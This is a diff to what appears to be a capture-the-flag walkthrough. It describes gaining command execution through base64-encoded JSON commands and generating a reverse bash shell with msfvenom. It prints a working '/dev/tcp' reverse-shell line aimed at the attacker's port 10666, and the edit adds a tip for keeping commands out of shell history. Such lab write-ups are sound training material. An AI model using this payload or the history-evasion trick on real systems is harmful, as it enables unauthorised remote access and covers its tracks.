@@ -106,7 +106,7 @@ First try to get command execution by base64 encoding a simple ls.
 {"job_id": 0, "cmd": "ls"}
 ```
 
-Cyberchef is a handy tool for base64 encoding, base64 clutters up your history IMO.
+Cyberchef is a handy tool for base64 encoding, the base64 command clutters up your history IMO, although starting the command with a space in zsh/bash will not add it to the bash_history.
 
 So:
 set HttpUnknownRequestResponse eyJqb2JfaWQiOiAwLCAiY21kIjogImxzIn0=
@@ -127,11 +127,12 @@ So yeah lets generate a shell with msfvenom and encode it inside the json.
 msfvenom -p cmd/unix/reverse_bash lhost=tun0 lport=10666 R
 ```
 
-[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+```
 [-] No arch selected, selecting arch: cmd from the payload
 No encoder specified, outputting raw payload
 Payload size: 70 bytes
 bash -c '0<&94-;exec 94<>/dev/tcp/IP/10666;sh <&94 >&94 2>&94'
+```
 
 So encoded to base64 we get.
 
